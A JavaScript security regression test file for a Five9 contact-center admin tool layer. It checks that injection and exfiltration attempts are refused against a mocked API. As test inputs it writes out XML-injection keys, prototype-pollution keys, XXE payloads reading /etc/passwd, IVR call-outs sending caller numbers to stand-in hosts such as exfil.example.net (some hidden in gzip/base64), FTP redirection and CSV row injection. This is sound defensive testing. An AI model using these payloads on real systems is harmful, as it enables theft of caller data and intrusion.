// Security regressions. Each test reproduces an exploit against a fake Five9
// (globalThis.fetch is replaced; nothing leaves the machine) and proves it is
// refused before anything is sent, or that what is sent is safe.

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { callTool } from '../src/tools.js';
import { xmlOf, mergeChanges, WRITABLE_FIELDS, ownAction } from '../src/five9.js';

const cfg = { username: 'u', password: 'p', host: 'api.five9.com', restConsumerKey: 'k', restConsumerSecret: 's', restDomainId: 'd' };

const env = (method, inner) => `<?xml version="1.0"?><env:Envelope xmlns:env="http://schemas.xmlsoap.org/soap/envelope/"><env:Body><ns2:${method}Response xmlns:ns2="http://service.admin.ws.five9.com/">${inner}</ns2:${method}Response></env:Body></env:Envelope>`;

// Fake Five9: answers every SOAP method with `fixtures[method]` (or an empty
// response) and every REST path with `rest[key]`. Records what was sent.
async function withFive9(fixtures, run, rest = {}) {
  const calls = [];
  const realFetch = globalThis.fetch;
  globalThis.fetch = async (input, init = {}) => {
    const url = new URL(String(input));
    const body = typeof init.body === 'string' ? init.body : '';
    const soap = /<ser:(\w+)>/.exec(body)?.[1] || null;
    calls.push({ url: url.href, method: init.method, soap, body });
    if (soap) {
      const h = fixtures[soap];
      const out = typeof h === 'function' ? h(body) : h ?? env(soap, '<return>ok</return>');
      return new Response(out, { status: 200, headers: { 'Content-Type': 'text/xml' } });
    }
    const h = rest[`${init.method || 'GET'} ${url.pathname}`];
    if (typeof h === 'function') return h(url, init);
    return new Response(JSON.stringify(h ?? { access_token: 'tok', expires_in: 3600 }), { status: 200, headers: { 'Content-Type': 'application/json' } });
  };
  try { await run(calls); } finally { globalThis.fetch = realFetch; }
}

const outbound = (name) => env('getOutboundCampaign', `<return><description>d</description><mode>BASIC</mode><name>${name}</name><state>NOT_RUNNING</state><type>OUTBOUND</type><dialingMode>PREDICTIVE</dialingMode></return>`);

// ---------- 1. XML injection through object keys ----------

const INJECT = 'description></description><resetAttemptsCounter>true</resetAttemptsCounter><!--';

test('object keys can never inject XML into a SOAP body', async () => {
  const cases = [
    ['manage_disposition', { action: 'modify', name: 'Scratch', fields: { [INJECT]: 'x' } }],
    ['manage_disposition', { action: 'create', name: 'Scratch', fields: { type: 'FinalDisp', [INJECT]: 'x' } }],
    ['modify_campaign', { campaign_name: 'Stopped Test', changes: { 'dialingMode></dialingMode><x>1</x><!--': 'PREVIEW' } }],
    ['modify_campaign', { campaign_name: 'Stopped Test', changes: { callWrapup: { 'timeout><a/><!--': 1 } } }],
    ['manage_contact_field', { action: 'modify', name: 'F1', changes: { 'displayAs></displayAs><type>NUMBER</type><!--': 'Long' } }],
    ['manage_campaign_profile_filter', { action: 'set_criteria', profile_name: 'P1', add_criteria: [{ compareOperator: 'Equals', leftValue: 'a', 'rightValue></rightValue></addCriteria><x/><!--': 'b' }] }],
    ['manage_campaign_profile_filter', { action: 'set_criteria', profile_name: 'P1', grouping: { 'type></type><y/><!--': 'All' } }],
    ['manage_campaign_profile_filter', { action: 'set_order', profile_name: 'P1', add_order_by: [{ 'fieldName></fieldName><z/><!--': 'x' }] }],
    ['manage_campaign_profile', { action: 'modify', name: 'P1', fields: { 'ANI></ANI><numberOfAttempts>99</numberOfAttempts><!--': '1' } }],
    ['manage_campaign_profile', { action: 'create', name: 'P1', fields: { 'ANI></ANI><x/><!--': '1' } }],
    ['manage_skill', { action: 'modify', name: 'S1', fields: { 'description></description><routeVoiceMails>true</routeVoiceMails><!--': 'x' } }],
    ['modify_user', { user_name: 'u1', changes: { 'active></active><!--': true } }],
    ['set_user_roles', { user_name: 'u1', add: ['supervisor'], permissions: { 'supervisor></supervisor><admin/><!--': ['Agents'] } }],
    ['set_user_roles', { user_name: 'u1', add: ['supervisor'], permissions: { supervisor: [{ type: 'Agents', 'value></value><x/><!--': true }] } }],
    ['manage_disposition', { action: 'modify', name: 'Scratch', fields: { someUnknownField: 'x' } }],
    ['modify_campaign', { campaign_name: 'Stopped Test', changes: JSON.parse('{"__proto__":{"name":"Live Production"}}') }],
  ];
  for (const [tool, args] of cases) {
    await withFive9({ getOutboundCampaign: outbound('Stopped Test') }, async (calls) => {
      await assert.rejects(() => callTool(cfg, tool, args), /not allowed|cannot be an object|must be/i, tool);
      assert.deepEqual(calls.map((c) => c.soap), [], `${tool} sent something`);
    });
  }
  assert.throws(() => xmlOf({ [INJECT]: 'x' }, 'disposition'), /not allowed/);
  assert.throws(() => xmlOf('x', 'a b'), /not allowed/);
  assert.throws(() => mergeChanges({}, { 'a<b': 1 }), /not allowed/);
  assert.equal(xmlOf({ name: '<x>&' }, 'skill'), '<skill><name>&lt;x&gt;&amp;</name></skill>');
});

test('legitimate changes still serialize in WSDL order', async () => {
  await withFive9({ getOutboundCampaign: outbound('Stopped Test') }, async (calls) => {
    await callTool(cfg, 'modify_campaign', { campaign_name: 'Stopped Test', changes: { dialingMode: 'PREVIEW', callWrapup: { enabled: true, timeout: { minutes: 1 } } } });
    const sent = calls.find((c) => c.soap === 'modifyOutboundCampaign').body;
    assert.match(sent, /<dialingMode>PREVIEW<\/dialingMode>/);
    assert.match(sent, /<callWrapup><enabled>true<\/enabled><timeout><minutes>1<\/minutes><\/timeout><\/callWrapup>/);
  });
  for (const list of Object.values(WRITABLE_FIELDS)) for (const k of list) assert.match(k, /^[A-Za-z_][A-Za-z0-9_]*$/);
});

// ---------- 2. Retargeting a write through a name inside changes or fields ----------

test('a name inside changes or fields can never redirect a write to another object', async () => {
  const retarget = [
    // Read Stopped Test, write Live Production with Stopped Test's settings.
    ['modify_campaign', { campaign_name: 'Stopped Test', changes: { name: 'Live Production' } }],
    ['modify_campaign', { campaign_name: 'Stopped Test', changes: { NAME: 'Live Production' } }],
    ['modify_campaign', { campaign_name: 'Stopped Test', changes: { Name: 'Live Production', description: 'x' } }],
    ['manage_campaign_profile', { action: 'modify', name: 'Unused', fields: { name: 'Used By Running' } }],
    // Copy one disposition's type (for example DoNotDial) onto another.
    ['manage_disposition', { action: 'modify', name: 'Scratch', fields: { name: 'Do Not Call' } }],
    ['manage_contact_field', { action: 'modify', name: 'notes', changes: { name: 'number1' } }],
    ['manage_skill', { action: 'modify', name: 'S1', fields: { name: 'Sales' } }],
    ['modify_user', { user_name: 'u1', changes: { userName: 'admin1' } }],
    ['modify_user', { user_name: 'u1', changes: { id: '7' } }],
    ['manage_circle', { action: 'create', name: 'Approved Name', fields: { name: 'Other Name' } }],
    ['manage_circle', { action: 'create', name: 'Approved Name', fields: { ID: 'x' } }],
  ];
  for (const [tool, args] of retarget) {
    await withFive9({}, async (calls) => {
      await assert.rejects(() => callTool(cfg, tool, args), /not allowed/, `${tool} ${JSON.stringify(args)}`);
      assert.deepEqual(calls.filter((c) => c.soap || c.method !== 'POST' || !c.url.endsWith('/oauth2/v1/token')).map((c) => c.soap || c.url), [], `${tool} sent something`);
    });
  }
  // Even if Five9 returns a different name, the identity written is the argument.
  await withFive9({ getDisposition: env('getDisposition', '<return><name>Other</name><type>FinalDisp</type></return>') }, async (calls) => {
    await callTool(cfg, 'manage_disposition', { action: 'modify', name: 'Scratch', fields: { description: 'x' } });
    const sent = calls.find((c) => c.soap === 'modifyDisposition').body;
    assert.match(sent, /<name>Scratch<\/name>/);
    assert.ok(!sent.includes('Other'));
  });
  // Creates: the top-level name always wins over one slipped into fields.
  await withFive9({}, async (calls) => {
    await callTool(cfg, 'manage_disposition', { action: 'create', name: 'Approved', fields: { name: 'Other', type: 'FinalDisp' } });
    await callTool(cfg, 'manage_skill', { action: 'create', name: 'Approved', fields: { name: 'Other' } });
    await callTool(cfg, 'manage_campaign_profile', { action: 'create', name: 'Approved', fields: { name: 'Other' } });
    for (const c of calls) {
      assert.match(c.body, /<name>Approved<\/name>/, c.soap);
      assert.ok(!c.body.includes('Other'), c.soap);
    }
  });
  // A legitimate campaign change writes exactly one <name>, the checked one.
  await withFive9({ getOutboundCampaign: outbound('Stopped Test') }, async (calls) => {
    await callTool(cfg, 'modify_campaign', { campaign_name: 'Stopped Test', changes: { description: 'new' } });
    const sent = calls.find((c) => c.soap === 'modifyOutboundCampaign').body;
    assert.equal((sent.match(/<name>/g) || []).length, 1);
    assert.match(sent, /<name>Stopped Test<\/name>/);
  });
  for (const [kind, list] of Object.entries(WRITABLE_FIELDS)) {
    if (kind === 'criteria' || kind === 'orderBy') continue;
    for (const id of ['name', 'userName', 'id']) assert.ok(!list.includes(id), `${kind} allows ${id}`);
  }
});

// ---------- 3. Unknown actions must never fall through to a delete ----------

const MIXED = {
  manage_campaign_profile: { name: 'P1' },
  manage_skill: { name: 'S1' },
  manage_disposition: { name: 'D1' },
  manage_contact_field: { name: 'F1' },
  manage_ivr_script: { name: 'IVR1' },
  manage_circle: { circle_id: 'c1' },
  manage_campaign_profile_filter: { profile_name: 'P1' },
  manage_tts_prompt: { name: 'T1', text: 'hi' },
  manage_wav_prompt: { name: 'W1', wav_base64: 'AAAA' },
  manage_agent_group: { name: 'G1', agents: ['a'] },
  manage_call_variable: { name: 'V1', group: 'Call' },
  manage_speed_dial: { code: '11', number: '5551234567' },
  manage_reason_code: { name: 'R1', type: 'NotReady' },
  manage_web_connector: { name: 'C1', url: 'https://x.example' },
  manage_dnc: { numbers: ['5551234567'] },
  manage_campaign_skills: { campaign_name: 'C', skills: ['S'] },
  manage_campaign_dnis: { campaign_name: 'C', dnis: ['5551234567'] },
  manage_campaign_dispositions: { campaign_name: 'C', dispositions: ['D'] },
  manage_campaign_lists: { campaign_name: 'C', list_name: 'L' },
  manage_user_skills: { user_name: 'u', skill_name: 'S' },
  control_campaign: { campaign_name: 'C' },
};
const JUNK = [undefined, null, '', 'CREATE', 'Create', ' create', 'create ', 'DELETE', 'remove ', '__proto__', 'constructor', 'toString', 'hasOwnProperty', ['delete'], {}, 1];

test('unrecognized actions throw and send nothing that changes Five9', async () => {
  for (const [tool, base] of Object.entries(MIXED)) {
    for (const action of JUNK) {
      await withFive9({}, async (calls) => {
        await assert.rejects(() => callTool(cfg, tool, { ...base, action }), (e) => /Unknown|use /i.test(e.message), `${tool} ${JSON.stringify(action)}`);
        const writes = calls.filter((c) => c.soap || (c.method && c.method !== 'GET' && !c.url.endsWith('/oauth2/v1/token')));
        assert.deepEqual(writes.map((c) => c.soap || `${c.method} ${c.url}`), [], `${tool} ${JSON.stringify(action)} sent something`);
      });
    }
  }
});

test('action lookups ignore prototype members', () => {
  for (const a of ['constructor', '__proto__', 'toString', 'valueOf', undefined, 1]) assert.equal(ownAction({ add: 'x' }, a), undefined);
  assert.equal(ownAction({ add: 'x' }, 'add'), 'x');
});

// ---------- 4. REST retries: bounded, GET only ----------

const restClient = async (extra = {}) => {
  const { Five9RestClient } = await import('../src/five9rest.js');
  const slept = [];
  const client = new Five9RestClient({ restConsumerKey: 'k', restConsumerSecret: 's', restDomainId: 'd', sleep: async (ms) => { slept.push(ms); }, ...extra });
  return { client, slept };
};

test('a long Retry-After is not waited out', async () => {
  const { client, slept } = await restClient();
  let hits = 0;
  await withFive9({}, async () => {
    await assert.rejects(() => client.request('GET', '/domains/v1/domains/{domainId}'), (e) => e.status === 429 && /60 seconds/.test(e.message));
  }, { 'GET /domains/v1/domains/d': () => { hits++; return new Response('slow down', { status: 429, headers: { 'Retry-After': '60' } }); } });
  assert.deepEqual(slept, []);
  assert.equal(hits, 1);
});

test('GET retries are capped at two, with short waits', async () => {
  const { MAX_RETRIES, MAX_RETRY_AFTER_MS } = await import('../src/five9rest.js');
  const { client, slept } = await restClient();
  let hits = 0;
  await withFive9({}, async () => {
    await assert.rejects(() => client.request('GET', '/x'), /rate limiting/);
  }, { 'GET /x': () => { hits++; return new Response('busy', { status: 429 }); } });
  assert.equal(hits, 1 + MAX_RETRIES);
  assert.ok(MAX_RETRIES <= 2 && MAX_RETRY_AFTER_MS <= 10_000);
  for (const ms of slept) assert.ok(ms <= MAX_RETRY_AFTER_MS);
});

test('writes are never retried, even on 5xx or 429', async () => {
  for (const status of [500, 502, 503, 429]) {
    const { client, slept } = await restClient();
    let posts = 0;
    await withFive9({}, async () => {
      await assert.rejects(() => client.request('POST', '/circles/v1/domains/{domainId}/circles', { body: { name: 'x' } }));
    }, { 'POST /circles/v1/domains/d/circles': () => { posts++; return new Response('oops', { status }); } });
    assert.equal(posts, 1, `status ${status}`);
    assert.deepEqual(slept, []);
  }
});

// ---------- 5. Secrets in IVR scripts and web connectors ----------

test('get_ivr_script and list_web_connectors scrub embedded secrets', async () => {
  const xml = '<ivrScript><webService><url>https://crm.example.com/api?api_key=SECRETKEY1&amp;id=1</url><user>svc</user><password>Hunter2!</password><authToken>tok-123</authToken></webService><auth password="Pw9" /></ivrScript>';
  const escaped = xml.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
  await withFive9({ getIVRScripts: env('getIVRScripts', `<return><name>Main</name><xmlDefinition>${escaped}</xmlDefinition></return>`) }, async () => {
    const script = await callTool(cfg, 'get_ivr_script', { name: 'Main' });
    const text = JSON.stringify(script);
    for (const s of ['SECRETKEY1', 'Hunter2!', 'tok-123', 'Pw9']) assert.ok(!text.includes(s), `get_ivr_script leaks ${s}`);
    assert.match(script.xmlDefinition, /<user>svc<\/user>/);
  });
  await withFive9({ getWebConnectors: env('getWebConnectors', '<return><name>CRM</name><url>https://u:pa55@crm.example.com/pop?token=abc123&amp;x=1</url><constants><key>apiKey</key><value>K-999</value></constants><constants><key>mode</key><value>full</value></constants></return>') }, async () => {
    const conns = await callTool(cfg, 'list_web_connectors', {});
    const text = JSON.stringify(conns);
    for (const s of ['pa55', 'abc123', 'K-999']) assert.ok(!text.includes(s), `list_web_connectors leaks ${s}`);
    assert.ok(text.includes('"full"'));
    assert.ok(text.includes('x=1'));
  });
});

// ---------- 6. CSV row injection through line breaks in record values ----------

const CR = String.fromCharCode(13);
const LF = String.fromCharCode(10);

test('a line break in a lead or contact value can never add CSV rows', async () => {
  const hundreds = Array.from({ length: 300 }, (_, i) => `555${String(i).padStart(7, '0')}`).join(CR);
  const cases = [];
  for (const c of [CR, LF, CR + LF, String.fromCharCode(0), String.fromCharCode(0x2028), String.fromCharCode(0x85)]) {
    cases.push(['add_record_to_list', { list_name: 'Cold', fields: { number1: '5550000001', first_name: `A${c}5550000002${c}5550000003` } }]);
    cases.push(['add_record_to_list', { list_name: 'Cold', fields: { number1: '5550000001', [`first${c}name`]: 'A' } }]);
    cases.push(['add_records_to_list', { list_name: 'Cold', records: [{ number1: `5550000001${c}5550000002` }] }]);
    cases.push(['bulk_update_contacts', { records: [{ number1: '5550000001', notes: `x${c}5550000002,y` }], key_fields: ['number1'] }]);
    cases.push(['delete_contact', { criteria: { number1: `5550000001${c}5550000002` } }]);
  }
  cases.push(['add_record_to_list', { list_name: 'Cold', fields: { number1: '5550000001', first_name: hundreds } }]);
  for (const [tool, args] of cases) {
    await withFive9({}, async (calls) => {
      await assert.rejects(() => callTool(cfg, tool, args), /line breaks or control characters/, tool);
      assert.deepEqual(calls.map((c) => c.soap), [], `${tool} sent something`);
    });
  }
  // Commas and quotes are quoted; one record is exactly one CSV line.
  await withFive9({ addToListCsv: env('addToListCsv', '<return><identifier>i1</identifier></return>') }, async (calls) => {
    const out = await callTool(cfg, 'add_records_to_list', { list_name: 'Cold', records: [{ number1: '5550000001', first_name: 'Doe, "Jr"' }, { number1: '5550000002' }] });
    const raw = /<csvData>([\s\S]*?)<\/csvData>/.exec(calls.find((c) => c.soap === 'addToListCsv').body)[1]
      .replace(/&quot;/g, '"').replace(/&amp;/g, '&');
    assert.deepEqual(raw.split(LF), ['5550000001,"Doe, ""Jr"""', '5550000002,']);
    assert.equal(out.recordCount, 2);
  });
});

// ---------- 7. Recording egress and repeated elements ----------

test('recording FTP settings cannot be changed through modify_campaign', async () => {
  for (const k of ['useFtp', 'ftpHost', 'ftpUser', 'ftpPassword']) {
    await withFive9({ getOutboundCampaign: outbound('Stopped Test') }, async (calls) => {
      await assert.rejects(() => callTool(cfg, 'modify_campaign', { campaign_name: 'Stopped Test', changes: { [k]: k === 'useFtp' ? true : 'exfil.example.net' } }), /not allowed/, k);
      assert.deepEqual(calls.map((c) => c.soap), [], `${k} sent something`);
    });
  }
  assert.ok(!WRITABLE_FIELDS.campaign.some((k) => /ftp/i.test(k)));
});

test('a writable field given as a list is refused (no repeated elements)', async () => {
  await withFive9({ getOutboundCampaign: outbound('Stopped Test') }, async (calls) => {
    await assert.rejects(() => callTool(cfg, 'modify_campaign', { campaign_name: 'Stopped Test', changes: { description: ['a', 'b'] } }), /cannot be a list/);
    assert.deepEqual(calls.map((c) => c.soap), []);
  });
});

test('get_ivr_script scrubs secrets named by a sibling key or name element', async () => {
  const xml = '<module><headers><entry><key>Authorization</key><value>Basic dXNlcjpzM2NyZXQ=</value></entry><entry><key>X-Api-Key</key><value>K-12345-abc</value></entry><entry><key>Accept</key><value>application/json</value></entry></headers><parameters><parameter><name>apiToken</name><value><stringValue>tok-777</stringValue></value></parameter></parameters><note>Bearer abcdefghijkl</note></module>';
  const escaped = xml.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
  await withFive9({ getIVRScripts: env('getIVRScripts', `<return><name>Main</name><xmlDefinition>${escaped}</xmlDefinition></return>`) }, async () => {
    const script = await callTool(cfg, 'get_ivr_script', { name: 'Main' });
    const text = JSON.stringify(script);
    for (const s of ['dXNlcjpzM2NyZXQ=', 'K-12345-abc', 'tok-777', 'abcdefghijkl']) assert.ok(!text.includes(s), `leaks ${s}`);
    assert.ok(text.includes('application/json') && text.includes('<key>Authorization</key>'));
  });
});

test('IVR flow node keys never resolve to prototype members', async () => {
  const { validateFlow } = await import('../src/ivr.js');
  for (const k of ['toString', 'constructor', '__proto__', 'hasOwnProperty']) {
    assert.equal(validateFlow({ entry: k, nodes: { a: { type: 'hangup' } } }).ok, false, k);
    assert.equal(validateFlow({ entry: 'a', nodes: { a: { type: 'play', prompt: { tts: 'x' }, next: k } } }).ok, false, k);
  }
});

// ---------- 8. IVR scripts that call outside systems ----------

const CALLOUT_XML = '<ivrScript><modules><query><url>https://exfil.example.net/c?ani=@Call.ANI@&amp;k=1</url></query></modules></ivrScript>';

test('an IVR script that calls out to any host needs the exact host list confirmed', async () => {
  const { ivrCallouts } = await import('../src/callouts.js');
  const variants = [
    [CALLOUT_XML, ['exfil.example.net']],
    ['<a><b>https&#58;//enc.example.net/x</b></a>', ['enc.example.net']],
    ['<a><![CDATA[https://cdata.example.net/x]]></a>', ['cdata.example.net']],
    ['<a><c u="https://attr.example.net/x"/></a>', ['attr.example.net']],
    ['<a><d>https%3A%2F%2Fpct.example.net%2Fp</d></a>', ['pct.example.net']],
    ['<a><webServiceModule><target>@Call.crm_url@</target></webServiceModule></a>', []],
  ];
  for (const [xml, hosts] of variants) {
    assert.deepEqual(ivrCallouts(xml).hosts, hosts, xml);
    for (const action of ['create', 'modify']) {
      await withFive9({}, async (calls) => {
        await assert.rejects(() => callTool(cfg, 'manage_ivr_script', { action, name: 'Main', xml_definition: xml }), /sends call data to outside systems/, xml);
        await assert.rejects(() => callTool(cfg, 'manage_ivr_script', { action, name: 'Main', xml_definition: xml, confirm_callout_hosts: ['other.example.com'] }), /sends call data to outside systems/);
        assert.deepEqual(calls.map((c) => c.soap), [], 'nothing sent');
        await callTool(cfg, 'manage_ivr_script', { action, name: 'Main', xml_definition: xml, confirm_callout_hosts: hosts });
        assert.ok(calls.some((c) => c.soap === (action === 'create' ? 'createIVRScript' : 'modifyIVRScript')));
      });
    }
  }
  // Plain scripts and namespace declarations need nothing.
  const plain = '<ivrScript xmlns="http://www.five9.com/ivr"><modules><play/></modules></ivrScript>';
  assert.equal(ivrCallouts(plain).any, false);
  await withFive9({}, async (calls) => {
    await callTool(cfg, 'manage_ivr_script', { action: 'modify', name: 'Main', xml_definition: plain });
    assert.ok(calls.some((c) => c.soap === 'modifyIVRScript'));
  });
  // get_ivr_script reports the hosts a script reaches.
  const escaped = CALLOUT_XML.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
  await withFive9({ getIVRScripts: env('getIVRScripts', `<return><name>Main</name><xmlDefinition>${escaped}</xmlDefinition></return>`) }, async () => {
    const got = await callTool(cfg, 'get_ivr_script', { name: 'Main' });
    assert.deepEqual(got.externalHosts, ['exfil.example.net']);
  });
});

// ---------- 9. Never write the redaction placeholder back ----------

test('a write that carries [redacted] from an earlier result is refused before any request', async () => {
  const cases = [
    ['manage_ivr_script', { action: 'modify', name: 'Main', xml_definition: '<module><entry><key>Authorization</key><value>[redacted]</value></entry></module>' }],
    ['manage_ivr_script', { action: 'create', name: 'Main', xml_definition: '<a>&#91;redacted&#93;</a>' }],
    ['manage_ivr_script', { action: 'create', name: 'Main', xml_definition: '<a>https://x.example/?k=%5Bredacted%5D</a>', confirm_callout_hosts: ['x.example'] }],
    ['modify_campaign', { campaign_name: 'C', changes: { description: 'see [REDACTED]' } }],
    ['manage_web_connector', { action: 'create', name: 'CRM', url: 'https://crm.example.com/?key=[redacted]' }],
  ];
  for (const [tool, args] of cases) {
    await withFive9({}, async (calls) => {
      await assert.rejects(() => callTool(cfg, tool, args), /\[redacted\] placeholders/, tool);
      assert.deepEqual(calls.map((c) => c.soap), [], tool);
    });
  }
  // The real round trip: get, then send the scrubbed text back.
  const xml = '<module><entry><key>Authorization</key><value>Basic dXNlcjpzM2NyZXQ=</value></entry></module>';
  const escaped = xml.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
  await withFive9({ getIVRScripts: env('getIVRScripts', `<return><name>Main</name><xmlDefinition>${escaped}</xmlDefinition></return>`) }, async (calls) => {
    const got = await callTool(cfg, 'get_ivr_script', { name: 'Main' });
    await assert.rejects(() => callTool(cfg, 'manage_ivr_script', { action: 'modify', name: 'Main', xml_definition: got.xmlDefinition }), /\[redacted\] placeholders/);
    assert.ok(!calls.some((c) => c.soap === 'modifyIVRScript'));
  });
});

// ---------- 10. XXE and outside destinations shown as they are ----------

test('XML with DOCTYPE, ENTITY or conditional sections is refused before any request', async () => {
  const xxe = [
    '<!DOCTYPE ivrScript [<!ENTITY e SYSTEM "file:///etc/passwd">]><ivrScript><description>&e;</description></ivrScript>',
    '<!doctype ivrScript><ivrScript/>',
    '<ivrScript><!ENTITY x "y"></ivrScript>',
    '<ivrScript><![ INCLUDE [<a/>]]></ivrScript>',
  ];
  for (const xml of xxe) {
    for (const action of ['create', 'modify']) {
      await withFive9({}, async (calls) => {
        await assert.rejects(() => callTool(cfg, 'manage_ivr_script', { action, name: 'X', xml_definition: xml }), /DOCTYPE, ENTITY/);
        assert.deepEqual(calls.map((c) => c.soap), []);
      });
    }
  }
});

test('call-out hosts are listed as they are: IPv4, IPv6, integer IPs, decoy authorities, run time URLs', async () => {
  const { ivrCallouts } = await import('../src/callouts.js');
  const BSL = String.fromCharCode(92);
  assert.deepEqual(ivrCallouts('<a>https://user:Pw1@203.0.113.50/c?token=abc</a>').hosts, ['203.0.113.50']);
  assert.deepEqual(ivrCallouts('<a>https://[2001:db8::1]:8443/x</a>').hosts, ['[2001:db8::1]']);
  assert.deepEqual(ivrCallouts('<a>https://3405803826/x</a>').hosts, ['203.0.113.50']);
  assert.deepEqual(ivrCallouts(`<a>https://crm.customer.com${BSL}@evil.example.net/c</a>`).hosts, ['crm.customer.com', 'evil.example.net']);
  assert.deepEqual(ivrCallouts('<a>%FF https%3A%2F%2Fpct.example.net%2Fp</a>').hosts, ['pct.example.net']);
  assert.equal(ivrCallouts('<q><url>https://crm.customer.com/a</url></q><q><url>@Call.target@</url></q>').dynamic, true);
  await withFive9({}, async () => {
    await assert.rejects(() => callTool(cfg, 'manage_ivr_script', { action: 'create', name: 'X', xml_definition: '<q><url>https://user:Pw1@203.0.113.50/c?token=abc</url></q>' }),
      (e) => /203\.0\.113\.50 \(RAW IP ADDRESS/.test(e.message) && !/Pw1|token=abc/.test(e.message));
  });
});

// ---------- 11. Encoded payloads: gzip, zlib and base64 are checked like plain text ----------

const zlibMod = await import('node:zlib');
const gz = (s) => zlibMod.gzipSync(Buffer.from(s)).toString('base64');
const ttsXml = (blob) => `<ivrScript><modules><play><data><prompt><ttsPrompt><xml>${blob}</xml><promptTTSEnumed>true</promptTTSEnumed></ttsPrompt></prompt></data></play></modules></ivrScript>`;

test('a host inside a gzip+base64 prompt payload needs the host confirmed like any call-out', async () => {
  const xml = ttsXml(gz('<speakElement><items><audioElement src="https://exfil.example.net/a?ani=@Call.ANI@"/></items></speakElement>'));
  await withFive9({}, async (calls) => {
    await assert.rejects(() => callTool(cfg, 'manage_ivr_script', { action: 'create', name: 'X', xml_definition: xml }), /exfil\.example\.net/);
    assert.deepEqual(calls.map((c) => c.soap), []);
    await callTool(cfg, 'manage_ivr_script', { action: 'create', name: 'X', xml_definition: xml, confirm_callout_hosts: ['exfil.example.net'] });
    assert.ok(calls.some((c) => c.soap === 'createIVRScript'));
  });
  const { ivrCallouts } = await import('../src/callouts.js');
  const hostOf = (x) => ivrCallouts(x).hosts;
  assert.deepEqual(hostOf(`<q><xml>${zlibMod.deflateSync('<a>http://zl.example.com/</a>').toString('base64')}</xml></q>`), ['zl.example.com']);
  assert.deepEqual(hostOf(`<q><xml>${zlibMod.deflateRawSync('<a>http://raw.example.com/</a>').toString('base64')}</xml></q>`), ['raw.example.com']);
  assert.deepEqual(hostOf(`<q><v>${Buffer.from('see https://b64.example.com/z').toString('base64')}</v></q>`), ['b64.example.com']);
  assert.deepEqual(hostOf(ttsXml(gz(`<a><xml>${gz('<b>https://deep.example.com/</b>')}</xml></a>`))), ['deep.example.com']);
  assert.deepEqual(hostOf(ttsXml(gz('<a>https://wrapped.example.org/x</a>').replace(/(.{20})/g, `$1${LF}`))), ['wrapped.example.org']);
  assert.deepEqual(hostOf(ttsXml(Buffer.concat([zlibMod.gzipSync('<a>hi</a>'), zlibMod.gzipSync('<b>https://member2.example.com/</b>')]).toString('base64'))), ['member2.example.com']);
  assert.deepEqual(hostOf(ttsXml(gz('<a>https://ent.example.com/</a>').replace(/^H/, '&#72;'))), ['ent.example.com']);
});

test('DOCTYPE, [redacted] and undecodable payloads inside encoded prompt text are refused before any request', async () => {
  const cases = [
    [ttsXml(gz('<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><speakElement>&e;</speakElement>')), /DOCTYPE, ENTITY/],
    [ttsXml(gz('<speakElement><body>&#91;redacted&#93;</body></speakElement>')), /\[redacted\] placeholders/],
    [ttsXml(gz('hello world hello world hello').slice(0, 40)), /could not be decoded/],
    [ttsXml(gz('<?xml version="1.0" encoding="UTF-7"?><a>+ADw-x+AD4-</a>')), /could not be decoded/],
    [ttsXml(zlibMod.gzipSync(Buffer.alloc(5_000_000, 32)).toString('base64')), /could not be decoded/],
  ];
  for (const [xml, re] of cases) {
    await withFive9({}, async (calls) => {
      await assert.rejects(() => callTool(cfg, 'manage_ivr_script', { action: 'modify', name: 'X', xml_definition: xml, confirm_callout_hosts: [] }), re);
      assert.deepEqual(calls.map((c) => c.soap), []);
    });
  }
  // What the designer (and build_ivr_script) writes is decoded, checked and passes.
  const { composeIvrXml } = await import('../src/ivr.js');
  const { ivrCallouts, decodePayloads } = await import('../src/callouts.js');
  const flow = { entry: 'm', nodes: { m: { type: 'menu', prompt: { tts: 'Press 1 for sales' }, options: [{ digit: 1, label: 'Sales', next: 'q' }] }, q: { type: 'skill_transfer', skills: ['Sales'], next: 'h' }, h: { type: 'hangup' } } };
  const { xml } = await composeIvrXml(flow, { skills: new Map([['sales', { id: 11, name: 'Sales' }]]), prompts: new Map() });
  assert.equal(decodePayloads(xml).bad, false);
  assert.ok(decodePayloads(xml).texts.length >= 5);
  assert.equal(ivrCallouts(xml).any, false);
  await withFive9({}, async (calls) => {
    await callTool(cfg, 'manage_ivr_script', { action: 'modify', name: 'X', xml_definition: xml });
    assert.ok(calls.some((c) => c.soap === 'modifyIVRScript'));
  });
});

test('the synchronous inflater matches node zlib and refuses bad input', async () => {
  const { gunzip, unzlib, inflateRaw, InflateError } = await import('../src/inflate.js');
  for (let i = 0; i < 60; i++) {
    const len = (i * 7919) % 9000;
    const buf = Buffer.alloc(len);
    for (let j = 0; j < len; j++) buf[j] = i % 3 === 0 ? (j * 31 + i) % 256 : i % 3 === 1 ? 97 + ((j * j + i) % 4) : 'hello <speakElement> '.charCodeAt(j % 21);
    const level = i % 10;
    assert.deepEqual(Buffer.from(gunzip(zlibMod.gzipSync(buf, { level }))), buf);
    assert.deepEqual(Buffer.from(unzlib(zlibMod.deflateSync(buf, { level }))), buf);
    assert.deepEqual(Buffer.from(inflateRaw(zlibMod.deflateRawSync(buf, { level, strategy: i % 4 === 0 ? zlibMod.constants.Z_FIXED : 0 })).bytes), buf);
  }
  const g = zlibMod.gzipSync('abc');
  assert.throws(() => gunzip(g.subarray(0, g.length - 3)), InflateError);
  assert.throws(() => gunzip(zlibMod.gzipSync(Buffer.alloc(2_000_000)), { max: 1_000_000 }), /too large/);
});

test('web connector constants named like API gateway keys are scrubbed', async () => {
  await withFive9({ getWebConnectors: env('getWebConnectors', '<return><name>CRM Pop</name><constants><key>Ocp-Apim-Subscription-Key</key><value>0123456789abcdef0123456789abcdef</value></constants><constants><key>x-functions-key</key><value>FK-PLAIN-1</value></constants><constants><key>client_secret</key><value>CS-2</value></constants><constants><key>Accept</key><value>application/json</value></constants></return>') }, async () => {
    const text = JSON.stringify(await callTool(cfg, 'list_web_connectors', {}));
    for (const s of ['0123456789abcdef0123456789abcdef', 'FK-PLAIN-1', 'CS-2']) assert.ok(!text.includes(s), s);
    assert.ok(text.includes('application/json'));
  });
